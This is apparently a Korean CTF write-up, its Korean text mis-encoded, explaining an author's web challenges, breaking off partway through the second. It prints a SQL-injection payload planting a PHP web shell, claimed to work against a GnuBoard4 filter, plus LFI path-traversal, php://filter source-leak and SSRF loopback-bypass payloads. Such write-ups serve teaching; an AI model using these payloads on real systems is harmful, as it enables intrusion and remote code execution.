    $data = preg_replace(&#x27;#(&lt;[^&gt;]+?)style[\\x00-\\x20]*=[\\x00-\\x20]*[`\\&#x27;&quot;]*.*?s[\\x00-\\x20]*c[\\x00-\\x20]*r[\\x00-\\x20]*i[\\x00-\\x20]*p[\\x00-\\x20]*t[\\x00-\\x20]*:*[^&gt;]*+&gt;#i&#x27;, &#x27;$1&gt;&#x27;, $data); 
    $data = preg_replace(&#x27;#&lt;/*\\w+:\\w[^&gt;]*+&gt;#i&#x27;, &#x27;&#x27;, $data); 

    do 
    { 
        $old_data = $data; 
        $data = preg_replace(&#x27;#&lt;/*(?:applet|b(?:ase|gsound|link)|embed|frame(?:set)?|i(?:frame|layer)|l(?:ayer|ink)|meta|object|s(?:cript|tyle)|title|xml)[^&gt;]*+&gt;#i&#x27;, &#x27;&#x27;, $data); 
    } 
    while ($old_data !== $data); 
     
    return $data; 
}

.......

$xmldata = xss_filter(mysqli_real_escape_string($dbc, $data));
$query = &#x27;update users set xmldata=&quot;&#x27;.$xmldata.&#x27;&quot; where userid=&quot;&#x27;.mysqli_real_escape_string($dbc, $_SESSION[&#x27;userid&#x27;]).&#x27;&quot;;&#x27;;
$res = mysqli_query($dbc, $query);
</code></pre><p id="7e647a95-c5f9-4cbf-8ae1-1655b2848c84" class="">
</p><p id="3abaaa5b-f13f-46ec-99d8-b51601216e0c" class="">RCEë¥¼ ìœ„í•´ í•´ë‹¹ ë¬¸ì œì—ì„œ ì‚¬ìš©í•´ì•¼í•  ê²ƒì€ &quot;/var/lib/php/sessions/&quot; ê²½ë¡œì— ìˆëŠ” PHP ì„¸ì…˜ íŒŒì¼ì„ ì‚¬ìš©í•˜ëŠ” ê²ƒ ë°–ì—ëŠ” ì—†ìœ¼ë¯€ë¡œ ë´ì•¼í•  ê²ƒì€ nicknameê³¼ useridì— PHP ì½”ë“œë¥¼ ë„£ì„ ìˆ˜ ìˆê²Œ SQLI ì¸ì ì…˜ì„ ìƒê°í•  ìˆ˜ ë°–ì— ì—†ë‹¤.</p><p id="feadcc0d-d413-4d33-b365-8f0571a0a415" class="">
</p><p id="6b171588-97d0-4c7f-85a1-79493d0c4db5" class="">mysqli_real_escape_string í•¨ìˆ˜ë¥¼ ì‚¬ìš©í•˜ë©´ SQLI ì·¨ì•½ì ì„ ë§‰ì„ ìˆ˜ ìˆì§€ë§Œ í•´ë‹¹ í•¨ìˆ˜ë¥¼ ì‚¬ìš©í•œë’¤ì— xss_filter í•¨ìˆ˜ë¥¼ ì‚¬ìš©í–ˆê¸° ë•Œë¬¸ì— SQLI ì·¨ì•½ì ì´ ì¼ì–´ë‚  ê³³ì€ ì—¬ê¸°ë°–ì— ì—†ë‹¤.</p><pre id="15ca7dce-852a-45c9-98b5-977068100df5" class="code"><code>$xmldata = xss_filter(mysqli_real_escape_string($dbc, $data));
$query = &#x27;update users set xmldata=&quot;&#x27;.$xmldata.&#x27;&quot; where userid=&quot;&#x27;.mysqli_real_escape_string($dbc, $_SESSION[&#x27;userid&#x27;]).&#x27;&quot;;&#x27;;
$res = mysqli_query($dbc, $query);
</code></pre><p id="0a165e4b-bd46-42e6-bc80-b16fe397c01c" class="">
</p><p id="8340a598-0838-4a37-956c-9f48778f660e" class="">ê·¸ í›„ xss_filterë¥¼ ìì„¸íˆ ì‚´í´ë³´ë©´ ì•„ë˜ì™€ ê°™ì€ í•¨ìˆ˜ë¥¼ ì°¾ì„ ìˆ˜ ìˆë‹¤.</p><pre id="e84a01b8-0ea5-4967-b2fd-8ed970c01c50" class="code"><code>   if (function_exists(&quot;html_entity_decode&quot;))
    {
        $data = html_entity_decode($data); 
    }
</code></pre><p id="a6d05afd-bf53-4269-99b1-752d8c144ddd" class="">
</p><p id="0abd4c58-7857-4a44-b823-03798951b135" class="">xssë¥¼ ë°©ì–´í•˜ê¸° ìœ„í•´ì„œ html_entity_decodeí•¨ìˆ˜ë¥¼ ì‚¬ìš©í•˜ëŠ”ë° ì—¬ê¸°ì—ì„œ ë¬¸ì œê°€ ë°œìƒí•œë‹¤.</p><p id="5ccfdb5d-1b7d-42ce-aaa3-3fddfba60efa" class="">ë§Œì•½ aaaa&quot;bbbb ë¥¼ ì‚¬ìš©í•œë‹¤ë©´ ì–´ë–»ê²Œ ë ê¹Œ?</p><p id="e7eebefd-9ddb-4ddf-a63e-d92ddbd15960" class="">
</p><p id="34c9c119-6cac-432d-80a8-ffff9df97f5f" class="">ìœ„ ë°ì´í„°ê°€ html_entity_decodeë¥¼ ê±°ì¹˜ë©´ ì•„ë˜ì™€ ê°™ì´ ë³€í™˜ëœë‹¤.</p><pre id="99d5c75c-c138-4039-a01f-594e6c0ff092" class="code"><code>aaaa&quot;bbbb
</code></pre><p id="8d357bbf-2abe-43c5-bd6b-6834df92a5df" class="">ë”°ë¼ì„œ ìš°ë¦¬ëŠ” quotë¬¸ìë¥¼ ì‚¬ìš©í•  ìˆ˜ ìˆê³  update ë¬¸ì—ì„œ SQLIê°€ ë°œìƒí•˜ê²Œ í•  ìˆ˜ ìˆë‹¤.</p><h3 id="f230690e-3cb1-4fed-b72b-101ade3db733" class="">ê³µê²© ì½”ë“œ</h3><pre id="0f458647-ce8e-4b73-acaf-d7ab399ebfa0" class="code"><code>aaaa&amp;quot;, nickname=&amp;quot;&lt;?php system($_GET[x]);
</code></pre><h3 id="db9ed796-eae9-4c29-ae83-20756799d52c" class="">ë³€í™˜ëœ ê³µê²© ì½”ë“œ</h3><pre id="527e62c7-13bd-4746-87df-9bb3ba0eb303" class="code"><code>aaaa&quot;, nickname=&quot;&lt;?php system($_GET[x]);
</code></pre><p id="8d5f9700-6a2d-4795-b0ec-5ae0f07ef60f" class="">
</p><p id="578a0988-5d20-444b-afda-438dcfadd224" class="">ì‚¬ì‹¤ ì´ë ‡ê²Œë§Œ ë³´ë©´ ì•„ì£¼ ê°„ë‹¨í•˜ê³  ì‰¬ìš´ ë¬¸ì œì´ì§€ë§Œ, ì´ ë¬¸ì œë¥¼ ë‚´ê²Œëœ ë°°ê²½ì´ ìˆë‹¤.</p><p id="bc61b24e-18a2-408b-a96a-1312dc1d1be4" class="">
</p><p id="589602d4-7752-43d7-a575-e7366805355c" class="">xss_filter í•¨ìˆ˜ëŠ” ê·¸ëˆ„ë³´ë“œ4ì—ì„œ ì‚¬ìš©ë˜ëŠ” &quot;xss_clean&quot; í•¨ìˆ˜ ì´ê³  ì œë¡œë°ì´ ì·¨ì•½ì ì´ì˜€ë‹¤. ì§€ê¸ˆì€ ê·¸ëˆ„ë³´ë“œ5ê°€ ë°°í¬ë˜ê³  ìˆì–´ì„œ ë¬¸ì œëŠ” ì—†ì§€ë§Œ ì•„ì§ë„ ê·¸ëˆ„ë³´ë“œ4 ë°°í¬ë³¸ ì—ì„œëŠ” ì œë¡œë°ì´ ì·¨ì•½ì ìœ¼ë¡œ ë‚¨ì•„ ìˆë‹¤.</p><p id="41959e0e-4de1-46f9-a0a2-57fdc6dc474b" class="">
</p><p id="a1e860d5-cc96-44e6-b5a9-32be99d9a781" class="">ê·¸ëˆ„ë³´ë“œ4ì—ì„œëŠ” &quot;common.php&quot;ì—ì„œ mysqli_real_escape_string ëŒ€ìš©ìœ¼ë¡œ addslashes í•¨ìˆ˜ë¥¼ ì´ìš©í•´ ì„œë²„ë¡œ ì˜¤ëŠ” ë³€ìˆ˜ì— ëŒ€í•´ ì „ì²´ì ìœ¼ë¡œ SQLIë¥¼ ë°©ì–´í•˜ê³  &quot;extract($_GET);&quot;, &quot;extract($_POST);&quot;ë¥¼ ì‚¬ìš©í•˜ì—¬ ì„œë²„ì— ì˜¤ëŠ” ë³€ìˆ˜ë¥¼ ê·¸ëŒ€ë¡œ PHP ë³€ìˆ˜ë¡œ ì‚¬ìš©í•  ìˆ˜ ìˆë‹¤.</p><pre id="f1dd110e-01b5-4c15-ab98-1d1c49f3926d" class="code"><code>if( !get_magic_quotes_gpc() )
{
	if( is_array($_GET) )
	{
		while( list($k, $v) = each($_GET) )
		{
			if( is_array($_GET[$k]) )
			{
				while( list($k2, $v2) = each($_GET[$k]) )
				{
					$_GET[$k][$k2] = addslashes($v2);
				}
				@reset($_GET[$k]);
			}
			else
			{
				$_GET[$k] = addslashes($v);
			}
		}
		@reset($_GET);
	}

same $_POST ...

same $_COOKIE ...
}
</code></pre><p id="8aade814-2241-4462-9f14-442e77285895" class="">
</p><p id="c09bce7c-6014-4214-8f01-0c62fdefee2b" class="">ê·¸ë˜ì„œ ì•„ë˜ì™€ ê°™ì´ ì‚¬ìš©í•˜ë©´ ì·¨ì•½ì ì„ ë°œê²¬í•˜ê¸° í˜ë“¤ë‹¤. ì–¸ëœ» ë³´ë©´ ê²Œì‹œíŒì—ì„œ xssë¥¼ ë°©ì–´í•˜ëŠ” ê²ƒ ê°™ì§€ë§Œ xss_clean í•¨ìˆ˜ ë•Œë¬¸ì— SQLI ì·¨ì•½ì ì´ ì¼ì–´ë‚œë‹¤.</p><pre id="86091e24-5504-4ef5-b96c-3a4994c216f6" class="code"><code>$query = &quot;update board set title=&#x27;$title&#x27;, body=&#x27;&quot;.xss_clean($body).&quot;&#x27;, &#x27;$userid&#x27; ...... &quot;;
</code></pre><p id="19858f94-a033-410c-baa0-55cd8c8c6067" class="">
</p><p id="9b46f025-4ade-4076-b3d3-543f86de1357" class="">babyweb ë¬¸ì œë¥¼ ë‚´ë©´ì„œ ì·¨ì•½ì ì„ ì‰½ê²Œ ì•Œì•„ë³¼ ìˆ˜ ìˆë„ë¡ login.php, join.php ë“±ì—ì„œëŠ” ì‘ì€ ë”°ì˜´í‘œë¥¼ ì‚¬ìš©í–ˆê³ , getxmldata.phpì—ì„œëŠ” í° ë”°ì˜´í‘œë¥¼ ì‚¬ìš©í–ˆìœ¼ë©°, SQLI ì·¨ì•½ì ì„ ì§ê´€ì ìœ¼ë¡œ ì•Œì•„ë³¼ ìˆ˜ ìˆë„ë¡ mysqli_real_escape_stringì„ ì „ì—­ì ìœ¼ë¡œ ì‚¬ìš©í•˜ì§€ ì•Šê³  xss_filterí•¨ìˆ˜ì™€ ê°™ì´ ë³´ì´ê²Œ ì‚¬ìš©í•˜ì˜€ë‹¤.</p><pre id="56bbc74d-0f14-4fbc-857e-f2840cccb37b" class="code"><code>$query = xss_filter(mysqli_real_escape_string(ë°ì´í„°));</code></pre><h2 id="aae9e3ee-3c0c-4baf-84fc-0b3ce4140773" class="">CatDog</h2><hr id="0bfba01f-16c2-47f8-a338-3646111d5876"/><figure id="9f0ff2df-a367-4f41-b550-8d9a0987de82" class="image"><a href="/assets/2020-09-01/bob/bob923.png"><img style="width:789px" src="/assets/2020-09-01/bob/bob923.png"/></a></figure><figure class="block-color-gray_background callout" style="white-space:pre-wrap;display:flex" id="d214b0a9-8fe1-4454-900f-ed2e5a0008ee"><div style="font-size:1.5em"><span class="icon">ğŸ’¡</span></div><div style="width:100%">lfi + sqli + ssrf
descriptionì˜ catì€ php, dogì€ python flaskë¥¼ ì˜ë¯¸í•œë‹¤.

8888í¬íŠ¸ë¡œ ëŒê³  ìˆëŠ” phpëŠ” flag íŒŒì¼ì˜ read ê¶Œí•œì´ ì—†ê¸° ë•Œë¬¸ì— ë‚´ë¶€ì—ì„œ ëŒê³  ìˆëŠ” flaskë¥¼ ì´ìš©í•˜ì—¬ flag íŒŒì¼ì„ ì½ì–´ì˜¤ëŠ” ê²ƒì´ ëª©í‘œì„.
ì´ flask ì„œë²„ëŠ” localhostë§Œ ì ‘ê·¼ ê°€ëŠ¥í•˜ë‹¤.

ì›¹ì„œë²„ì—ì„œ ì¼ë°˜ì ìœ¼ë¡œ ê°€ì§€ëŠ” &#x27;www-data&#x27; ê¶Œí•œì´ ì•„ë‹Œ &#x27;php&#x27; ìœ ì €ë¡œ ëŒì•„ê°„ë‹¤ëŠ” ì„¤ëª…ì´ flask í¬íŠ¸ë¥¼ ì–»ì„ ìˆ˜ ìˆëŠ” íŒíŠ¸ì„.

lfië¥¼ í†µí•´ flask í¬íŠ¸ë¥¼ ì•Œì•„ë‚¸ í›„ ssrfë¥¼ ì´ìš©í•˜ì—¬ flask ì„œë¹„ìŠ¤ì— ì ‘ê·¼í•˜ë©´ /flag pathì—ì„œ passcodeë¥¼ ìš”êµ¬í•œë‹¤. ì´ passcodeëŠ” sqlië¥¼ ì´ìš©í•˜ì—¬ ì–»ì–´ë‚¼ ìˆ˜ ìˆë‹¤.

/flag?passcode=@@@@ì™€ ê°™ì´ passcodeë¥¼ ì…ë ¥í•˜ë©´ í”Œë˜ê·¸ë¥¼ ì–»ì„ ìˆ˜ ìˆë‹¤.</div></figure><p id="140131f8-4dbc-4c9b-8304-8a833cf68d69" class="">
</p><h3 id="74063420-0d24-481d-a0e9-b9e94799b939" class="">1. index.php ì†ŒìŠ¤ì½”ë“œ ì¶”ì¶œ + lfi ì·¨ì•½ì </h3><figure id="96f7b2ef-b376-4d30-b39d-fc86fb76336c" class="image"><a href="/assets/2020-09-01/bob/bob924.png"><img style="width:1920px" src="/assets/2020-09-01/bob/bob924.png"/></a></figure><figure id="9c78ce62-3c7f-471e-a960-bc8e1d0bd87e" class="image"><a href="/assets/2020-09-01/bob/bob925.png"><img style="width:656px" src="/assets/2020-09-01/bob/bob925.png"/></a></figure><ul id="0ffebfd3-e925-405c-8cd8-643704ff79a8" class="bulleted-list"><li>ë©”ì¸í˜ì´ì§€ì—ì„œ view-sourceë¥¼ í•˜ë©´ 68ë²ˆì§¸ ë¼ì¸ì— ì£¼ì„ìœ¼ë¡œ <code>index.php/?source</code> ê°€ ìˆë‹¤.</li></ul><pre id="23701e6a-6273-4496-bcae-68db4dd77e54" class="code"><code>&lt;?php
    include_once &quot;header.php&quot;;
    include_once &quot;config.php&quot;;
    if(isset($_GET[&#x27;source&#x27;])){
        echo &quot;&lt;div style=&#x27;margin-top: 6rem;&#x27;/&gt;&quot;;
        highlight_file(__FILE__);
        die();
    }
    
    $page = $_GET[&quot;page&quot;];
    if(isset($page) and is_string($page)){
        if(preg_match(&quot;/.php/&quot;, $page) === 0){
            $page .= &quot;.php&quot;;
        }

        if(preg_match(&quot;/(login|register)/&quot;, $page) === 0 &amp;&amp; $_SESSION[&quot;username&quot;] == null){
            echo &quot;&lt;script&gt;alert(&#x27;Please Login!&#x27;);location.href=&#x27;/?page=login&#x27;;&lt;/script&gt;&quot;;
            die();
        }
        include $page;
        die();
    }
?&gt;
&lt;!-- index.php/?source --&gt;
&lt;div style=&quot;position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%);&quot;&gt;
    &lt;div&gt;
        &lt;img src=&quot;/images/bg.jpg&quot; style=&quot;width: 100%; height: 80vh; object-fit: cover; opacity: 0.5&quot;/&gt;
    &lt;/div&gt;
    &lt;div style=&quot;display: flex; justify-content: center;&quot;&gt;
        &lt;div style=&quot;font-size: 4rem;&quot;&gt;
            meow
        &lt;/div&gt;
    &lt;/div&gt;
&lt;/div&gt;</code></pre><ul id="cebaafc4-47d7-4312-a469-0bafd1728f8f" class="bulleted-list"><li><code>index.php/?source</code> ì— ì ‘ê·¼í•˜ë©´ <code>index.php</code> ì˜ ì†ŒìŠ¤ì½”ë“œë¥¼ ì–»ì„ ìˆ˜ ìˆë‹¤.</li></ul><ul id="d2819eb9-3e46-427d-b39a-fd54f9be0574" class="bulleted-list"><li><code>$page</code> íŒŒë¼ë¯¸í„°ë¥¼ includeí•˜ëŠ” ê²ƒìœ¼ë¡œ ë³´ì•„ lfi ì·¨ì•½ì ì´ ë°œìƒí•  ìˆ˜ ìˆëŠ” ê°€ëŠ¥ì„±ì„ ë³¼ ìˆ˜ ìˆë‹¤.</li></ul><pre id="48caa50a-8a79-473f-90f4-4cfe93fbd38a" class="code"><code>        if(preg_match(&quot;/.php/&quot;, $page) === 0){
            $page .= &quot;.php&quot;;
        }</code></pre><ul id="ebfe6de9-0c8a-4603-bef5-506c93e4ae20" class="bulleted-list"><li><code>$page</code> íŒŒë¼ë¯¸í„°ì— <code>.php</code> ê°€ ì¡´ì¬í•˜ì§€ ì•Šì„ ê²½ìš° ë§ˆì§€ë§‰ì— <code>.php</code> ë¥¼ ì¶”ê°€í•˜ëŠ” ì½”ë“œê°€ ìˆì§€ë§Œ, í•´ë‹¹ ì •ê·œí‘œí˜„ì‹ì€ <code>.php</code> ê°€ ì¡´ì¬í•˜ê¸°ë§Œ í•œë‹¤ë©´ ìš°íšŒê°€ ê°€ëŠ¥í•˜ë‹¤.</li></ul><ul id="0304f172-07ff-4557-9836-8799aae8d992" class="bulleted-list"><li>ë”°ë¼ì„œ <code>/?page=/.php/../../../../../../etc/issue</code> ì™€ ê°™ì€ í˜ì´ë¡œë“œë¥¼ í†µí•´ file leakì´ ê°€ëŠ¥í•˜ë‹¤.</li></ul><ul id="d28bcadf-caf9-461a-b5c6-b15360d7816b" class="bulleted-list"><li>ë˜í•œ, <code>/?page=php://filter/convert.base64-encode/resource=articles</code> ì™€ ê°™ì´  php wrapperë¥¼ ì´ìš©í•˜ì—¬ ì„œë¹„ìŠ¤ì— ì¡´ì¬í•˜ëŠ” php ì†ŒìŠ¤ì½”ë“œë¥¼ ëª¨ë‘ leakí•˜ëŠ” ê²ƒì´ ê°€ëŠ¥í•˜ë‹¤.</li></ul><p id="9f15f7ed-978b-471c-bb9a-cef417704345" class="">
</p><h3 id="d76249b1-b72f-4e85-bce1-864bb6a0a5e0" class="">2. ssrf ì·¨ì•½ì </h3><figure id="3914f05c-5776-4b1b-a8e3-8d438896a9a8" class="image"><a href="/assets/2020-09-01/bob/bob926.png"><img style="width:1920px" src="/assets/2020-09-01/bob/bob926.png"/></a></figure><ul id="5e799b36-2bc0-498c-bbab-dc059ade9027" class="bulleted-list"><li>ë‹¤ìŒìœ¼ë¡œ articlesë¥¼ ë³´ë©´ ê¸€ ì‘ì„± ì‹œ ì´ë¯¸ì§€ê°€ ìë™ìœ¼ë¡œ ì²¨ë¶€ë˜ëŠ” ê²ƒì„ í™•ì¸í•  ìˆ˜ ìˆëŠ”ë°, ì´ ì´ë¯¸ì§€ë¥¼ mypageì—ì„œ ë³€ê²½í•  ìˆ˜ ìˆë‹¤.</li></ul><figure id="f75568c7-603a-494d-93fd-8370f3202245" class="image"><a href="/assets/2020-09-01/bob/bob927.png"><img style="width:1920px" src="/assets/2020-09-01/bob/bob927.png"/></a></figure><pre id="5a04937e-cd90-4f1d-8087-6d975759cc1d" class="code"><code>&lt;!-- ... --&gt;

&lt;?php
    if(isset($_POST[&quot;type&quot;])){
        sleep(3);
        $url = trim($_POST[&quot;url&quot;]);

        if(preg_match(&quot;/^(http\:\/\/|https\:\/\/)/&quot;, $url) === 0 || preg_match(&quot;/(127\.0\.0\.1|localhost)/&quot;, $url) === 1){
            echo(&quot;&lt;script&gt;alert(&#x27;Don\&#x27;t hack!&#x27;);location.href=&#x27;/?page=mypage&#x27;;&lt;/script&gt;&quot;);
            die();
        }

        if(!isset($url) || $url == &quot;&quot;){
            echo(&quot;&lt;script&gt;alert(&#x27;Enter the image URL!&#x27;);location.href=&#x27;/?page=mypage&#x27;;&lt;/script&gt;&quot;);
            die();
        }

        if($_POST[&quot;type&quot;] === &quot;p&quot;){
            $data = base64_encode(file_get_contents($url));
            $src = &quot;data: png;base64,${data}&quot;;
            echo &quot;&lt;img src=&#x27;${src}&#x27; style=&#x27;height: 40vh; width: 100%; object-fit: cover;&#x27;/&gt;&quot;;
        }

        else if($_POST[&quot;type&quot;] === &quot;o&quot;){
            $stmt = $sql-&gt;prepare(&quot;update user set img = ? where username = ?&quot;);
            $stmt-&gt;bind_param(&#x27;ss&#x27;, $url, $_SESSION[&quot;username&quot;]);
            $stmt-&gt;execute();
        
            $result = $stmt-&gt;get_result();
            echo &quot;&lt;script&gt;alert(&#x27;Complete.&#x27;);location.href=&#x27;/?page=articles&#x27;&lt;/script&gt;&quot;;
        }
    }
?&gt;

&lt;!-- ... --&gt;</code></pre><ul id="a2abf4a1-103b-4413-81e3-0f071929521d" class="bulleted-list"><li>mypageì˜ ì½”ë“œë¥¼ í™•ì¸í•´ë³´ë©´ previewë¥¼ ëˆŒë €ì„ ë•Œ <code>file_get_contents</code> ë¥¼ ì´ìš©í•˜ì—¬ <code>url</code> ì˜ ê°’ì„ ê°€ì ¸ì˜¨ í›„ base64ë¡œ ì¸ì½”ë”©í•˜ì—¬ ì´ë¯¸ì§€ë¥¼ ë³´ì—¬ì¤€ë‹¤.</li></ul><ul id="5982d2c4-5f1a-499c-a09e-f38047a319c5" class="bulleted-list"><li>ì´ ë•Œ <code>file_get_contents</code> ë¥¼ ì´ìš©í•œ file leakì„ ë°©ì§€í•˜ê¸° ìœ„í•´ <code>http/https scheme</code> ë¥¼ ê°•ì œí•˜ì˜€ìœ¼ë©°, <code>localhost</code> ì™€ <code>127.0.0.1</code> ì˜ ê°’ì„ ë§‰ì•„ë‘ì—ˆë‹¤.</li></ul><ul id="127581ce-4dd5-4a0a-ba44-18dfb1da28dc" class="bulleted-list"><li>ì—¬ê¸°ì„œ ë„ë©”ì¸ì„ <code>localhost</code> ì™€ <code>127.0.0.1</code> ëŒ€ì‹  <code>http://0</code> ì´ë‚˜ 10ì§„ìˆ˜ í‘œí˜„ <code>http://213070643</code> ë˜ëŠ” 16ì§„ìˆ˜ í‘œí˜„ <code>http://0x7F000001</code> ë“±ì„ ì‚¬ìš©í•˜ì—¬ ìš°íšŒí•˜ë©´ ssrf ì·¨ì•½ì ì´ ë°œìƒí•œë‹¤.</li></ul><p id="ec4dfd72-dd3a-4822-aa1b-853c2c8a3bc3" class="">
</p><h3 id="2fb72a82-082d-4118-ad62-ea24566e5749" class="">3. íŒíŠ¸</h3><figure id="a287569b-7e04-4e28-a54f-e64decd85408" class="image"><a href="/assets/2020-09-01/bob/bob928.png"><img style="width:790px" src="/assets/2020-09-01/bob/bob928.png"/></a></figure><ul id="ee58e01a-d4d2-44e0-8d80-ea3da582cbd4" class="bulleted-list"><li>ë‹¤ì‹œ ë¬¸ì œ descriptionì„ ì‚´í´ë³´ë©´ ì£¼ë¨¸ë‹ˆì— <code>ê°œ</code> ë¥¼ ìˆ¨ê²¨ë‘ì—ˆìœ¼ë©°, í”Œë˜ê·¸ë¥¼ ê°€ì§€ê³  ìˆë‹¤ê³  í•œë‹¤. í˜„ì¬ë¡œì„  ê°œê°€ ì–´ë–¤ <code>ê°œ</code> ê°€ ì–´ë–¤ ê²ƒì„ ì˜ë¯¸í•˜ëŠ”ì§€ ì•Œ ìˆ˜ ì—†ë‹¤.</li></ul><ul id="6027ce58-3d1d-409a-962b-3da973491a8e" class="bulleted-list"><li>ë‹¤ìŒìœ¼ë¡œ, í•˜ë‹¨ì˜ ë°•ìŠ¤ë¥¼ í™•ì¸í•´ë³´ë©´ ì›¹ì„œë²„ê°€ <code>www-data</code> ê°€ ì•„ë‹Œ <code>php</code> ìœ ì €ë¡œ ëŒê³  ìˆë‹¤ëŠ” ê²ƒì„ í™•ì¸í•  ìˆ˜ ìˆë‹¤.</li></ul><ul id="b9fa9422-6b9b-4366-8ea0-3d08b28b3797" class="bulleted-list"><li>ì›¹ì„œë²„ì˜ ìœ ì €ë¥¼ ë³€ê²½í•˜ì—¬ ì‚¬ìš©í•˜ëŠ” ê²½ìš°ëŠ” íŠ¹ìˆ˜í•œ ê²½ìš°ì´ê¸° ë•Œë¬¸ì—, ì˜ì‹¬í•´ë³¼ ì—¬ì§€ê°€ ìˆë‹¤.</li></ul><figure id="c8eecd34-6053-4c15-8423-23384ca26fa3" class="image"><a href="/assets/2020-09-01/bob/bob929.png"><img style="width:665px" src="/assets/2020-09-01/bob/bob929.png"/></a></figure><ul id="f8b7fa8f-5451-4379-99c9-0cda19f7770e" class="bulleted-list"><li>php ê³„ì •ì— ëŒ€í•œ íŒíŠ¸ë¥¼ ì–»ì—ˆìœ¼ë‹ˆ, lfi ì·¨ì•½ì ì„ ì´ìš©í•´ <code>/etc/passwd</code> íŒŒì¼ì„ í™•ì¸í•´ë³´ì.</li></ul><ul id="ac2db54c-e15b-4689-92ff-c15aaad2392c" class="bulleted-list"><li>í•´ë‹¹ íŒŒì¼ì—ëŠ” php ê³„ì •ê³¼ python ê³„ì •ì´ ì¡´ì¬í•˜ë©°, <code>/home/php</code> ì™€ <code>/home/python</code> ê°€ í™ˆ ë””ë ‰í† ë¦¬ë¡œ ì§€ì •ë˜ì–´ ìˆë‹¤. ë˜í•œ, ê³„ì • ì ‘ê·¼ ì‹œ <code>/bin/bash</code> ë¥¼ ì‚¬ìš©í•˜ëŠ” ê²ƒìœ¼ë¡œ ë³´ì•„ ì‰˜ì„ ì‚¬ìš©í•œë‹¤ëŠ” ê²ƒì„ ìœ ì¶”í•  ìˆ˜ ìˆë‹¤.</li></ul><figure id="e34d3f50-021a-4e93-89f1-1bf2898a0879" class="image"><a href="/assets/2020-09-01/bob/bob930.png"><img style="width:747px" src="/assets/2020-09-01/bob/bob930.png"/></a></figure><ul id="6fb587e7-d867-4c97-8aaa-88f10a406807" class="bulleted-list"><li><code>php</code> ê³„ì • í™ˆ ë””ë ‰í† ë¦¬ì— ì¡´ì¬í•˜ëŠ” <code>.bash_history</code> ë¥¼ í™•ì¸í•´ë³´ë©´ <code>localhost</code> ì˜ 2026 í¬íŠ¸ë¡œ <code>curl</code> ìš”ì²­ì„ ë‚ ë¦¬ëŠ” ê²ƒì„ í™•ì¸í•  ìˆ˜ ìˆë‹¤. ì´ë¥¼ í†µí•´ ë¬¸ì œ descriptionì˜ <code>ê°œ</code> ê°€ ì›¹ ì„œë¹„ìŠ¤ë¼ëŠ” ê²ƒì„ ì•Œ ìˆ˜ ìˆë‹¤.</li></ul><ul id="90d320ad-e008-4597-b167-35b32c998490" class="bulleted-list"><li>í•´ë‹¹ í¬íŠ¸ì—ì„œ ëŒê³  ìˆëŠ” ì›¹ ì„œë¹„ìŠ¤ëŠ” <code>localhost</code> ì—ì„œë§Œ ì ‘ê·¼ì´ ê°€ëŠ¥í•˜ë„ë¡ ì„¤ì •í•˜ì˜€ê¸° ë•Œë¬¸ì—, ì´ì „ì— ë°œê²¬í–ˆë˜ <code>ssrf</code> ì·¨ì•½ì ì„ í†µí•´ ìš”ì²­ì„ í•´ì•¼ë§Œ í•œë‹¤.</li></ul><p id="d9e2b682-d7c4-4e63-a2a1-1d5efbc7ff03" class="">
</p><h3 id="7ab844cd-3745-42c0-b53f-66f64a450f5d" class="">4. ìˆ¨ê²¨ì§„ ì›¹ ì„œë¹„ìŠ¤(dog) ìš”ì²­</h3><figure id="23a67487-8a05-45cd-8288-ef1223d273ee" class="image"><a href="/assets/2020-09-01/bob/bob931.png"><img style="width:1920px" src="/assets/2020-09-01/bob/bob931.png"/></a></figure><ul id="8ac77972-702e-4def-816b-b222ed67330a" class="bulleted-list"><li><code>mypage</code> ì—ì„œ <code>http://0:2026</code> ìœ¼ë¡œ <code>preview</code> ë¥¼ ìš”ì²­í•˜ë©´ ì •ìƒì ìœ¼ë¡œ ìš”ì²­ë˜ëŠ” ê²ƒì„ í™•ì¸í•  ìˆ˜ ìˆë‹¤.</li></ul><pre id="4ac1278e-0884-420e-8a55-9088c1a32116" class="code"><code>http://0:2026

Well done! Go to /flag</code></pre><ul id="4479fd6f-4295-4ba5-b423-a9d81fb750ad" class="bulleted-list"><li>í•˜ë‹¨ì˜ ì´ë¯¸ì§€ë¥¼ <code>ìƒˆ íƒ­ì—ì„œ ì—´ê¸°</code> ë“±ì„ ì´ìš©í•˜ì—¬ ë°ì´í„°ë¥¼ í™•ì¸í•´ë³´ë©´ <code>localhost</code> ì˜ 2026 í¬íŠ¸ë¡œ ëŒê³  ìˆëŠ” <code>ì›¹ ì„œë¹„ìŠ¤</code> ë¥¼ í™•ì¸í•  ìˆ˜ ìˆìœ¼ë©°, <code>/flag</code> pathë¡œ ì´ë™í•˜ë¼ëŠ” ë©”ì‹œì§€ê°€ ë‚˜íƒ€ë‚œë‹¤.</li></ul><pre id="b284f658-0738-44f6-940a-86a97d0de6b0" class="code"><code>http://0:2026/flag

Usage : /flag?passcode=
/flag has a delay for 3sec.
Do not bruteforce!</code></pre><ul id="d38582b1-e5e7-428d-b47c-7149e0494cdb" class="bulleted-list"><li><code>/flag</code> pathì— ì ‘ê·¼í•˜ë©´ <code>passcode</code> ë¥¼ ìš”êµ¬í•œë‹¤. <code>mypage</code> í˜ì´ì§€ì™€ ë™ì¼í•˜ê²Œ 3ì´ˆì˜ ë”œë ˆì´ë¥¼ ê°€ì§€ê³  ìˆëŠ” ê²ƒì„ í™•ì¸í•  ìˆ˜ ìˆë‹¤.</li></ul><pre id="f51551bc-e8bc-4a70-bffd-f612fc281072" class="code"><code>http://0:2026/flag?passcode=1234

Wrong passcode!
Go back to PHP... You can get the passcode in PHP</code></pre><ul id="e2a88a0f-a3b0-4139-8ad3-1a0288d2da59" class="bulleted-list"><li>ì•„ë¬´ <code>passcode</code> ë¥¼ ì…ë ¥í•˜ë©´ ìœ„ì™€ ê°™ì€ ì•ˆë‚´ ë©”ì‹œì§€ê°€ ë‚˜íƒ€ë‚œë‹¤. í˜„ì¬ ì„œë¹„ìŠ¤ì—ì„œ <code>passcode</code> ë¥¼ ì–»ì„ ìˆ˜ ìˆëŠ” ë°©ë²•ì´ ì—†ê¸° ë•Œë¬¸ì— <code>php</code> ì„œë¹„ìŠ¤ë¡œ ëŒì•„ê°€ì.</li></ul><p id="3a70cb43-5738-4247-aa40-fcf242b174fc" class="">
